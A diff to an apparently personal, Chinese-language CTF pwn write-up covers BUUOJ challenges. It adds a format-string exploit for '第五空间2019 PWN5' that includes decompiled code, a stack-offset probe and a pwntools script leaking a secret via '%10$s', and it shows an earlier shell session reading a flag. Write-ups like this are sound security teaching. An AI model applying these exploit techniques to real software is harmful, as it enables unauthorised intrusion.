@@ -297,7 +297,7 @@ timeout: the monitored command dumped core
 [*] Closed connection to node5.buuoj.cn port 29765
 ````
 
-## ciscn_2019_n_1
+## ciscn_2019_n_1 （改值）
 
 和上面一样：
 
@@ -679,6 +679,8 @@ sh.sendline(payload)
 sh.interactive()
 ```
 
+拿下！
+
 ```bash
 PS C:\Users\root> & "D:/Program Files/python/python.exe" //wsl.localhost/Debian/home/wuko233/Projects/pwn/jarvisoj_level0/hack.py
 [x] Opening connection to node5.buuoj.cn on port 25201
@@ -699,4 +701,120 @@ usr
 var
 cat flag.txt
 flag{ab0c2d86-23b2-4460-b29f-a7d2975812d6}
+```
+
+## [第五空间2019 决赛]PWN5 (字符串格式化漏洞)
+
+```
+[*] '/home/wuko233/Projects/pwn/[第五空间2019 决赛]PWN5/pwn'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+```
+
+注意到：
+
+**RELRO:      Partial RELRO**
+
+**Stack:      Canary found**
+
+这很坏了，开启了栈保护（Canary），传统的栈溢出覆盖返回地址的方式会被检测到，导致程序终止。因此需要先泄露Canary值，或者寻找其他漏洞点。
+
+```c
+{
+  unsigned int v1; // eax
+  int result; // eax
+  int fd; // [esp+0h] [ebp-84h]
+  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
+  char buf[100]; // [esp+14h] [ebp-70h] BYREF
+  unsigned int v6; // [esp+78h] [ebp-Ch]
+  int *v7; // [esp+7Ch] [ebp-8h]
+
+  v7 = &a1;
+  v6 = __readgsdword(0x14u);
+  setvbuf(stdout, 0, 2, 0);
+  v1 = time(0);
+  srand(v1);
+  fd = open("/dev/urandom", 0);
+  read(fd, &dword_804C044, 4u);
+  printf("your name:");
+  read(0, buf, 0x63u);
+  printf("Hello,");
+  printf(buf);
+  printf("your passwd:");
+  read(0, nptr, 0xFu);
+  if ( atoi(nptr) == dword_804C044 )
+  {
+    puts("ok!!");
+    system("/bin/sh");
+  }
+  else
+  {
+    puts("fail");
+  }
+  result = 0;
+  if ( __readgsdword(0x14u) != v6 )
+    sub_80493D0();
+  return result;
+}
+```
+
+注意到`printf(buf);`，直接输出用户输入内容，这里是一个**字符串格式化漏洞**：
+
+[CTF Wiki - Format String](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/)
+
+当程序使用 `printf(user_input)` 时，如果用户输入包含格式化字符（如 `%s`, `%x`, `%n`），会触发以下风险：
+
+- `%s`：读取任意地址数据
+
+- `%x`：泄漏栈数据
+
+- `%n`：向任意地址写入数据（写入已输出的字符数）
+
+用`netcat`连一下：
+
+```bash
+nc node5.buuoj.cn 26814
+```
+
+输入`AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p`，获取printf栈上14个参数：
+
+| 返回地址 | 旧ebp | 格式化字符串指针 | [参数1] | [参数2] | ... |
+
+也就是输入的内容buf指针往后14个参数，得到：
+
+```
+Hello,AAAA.0xff94c828.0x63.(nil).0xff94c84e.0x3.0xc2.0xf7de691b.0xff94c84e.0xff94c94c.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252eDR������your passwd:
+```
+
+注意到`0x41414141`出现在第10个，说明输入字符串的起始地址位于栈上指针后第10个参数的位置，因此可以使用 `%10$` 系列格式化符来访问和操作这个位置。
+
+
+```python
+from pwn import *
+
+host = "node5.buuoj.cn"
+port = 28774
+
+
+# p = process('./pwn')
+sh = remote(host, port)
+
+rand_address = 0x804C044
+
+
+payload = p32(rand_address) + b'%10$s'
+
+sh.sendlineafter('your name:', payload)
+rec_data = sh.recvuntil(b"your passwd:")
+print(rec_data)
+idx = rec_data.find(b'Hello,') + len(b'Hello,')
+print(rec_data[idx + 4: idx + 8])
+print(u32(rec_data[idx + 4: idx + 8]))
+print(str(u32(rec_data[idx + 4: idx + 8])).encode())
+
+sh.interactive()
+
 ```
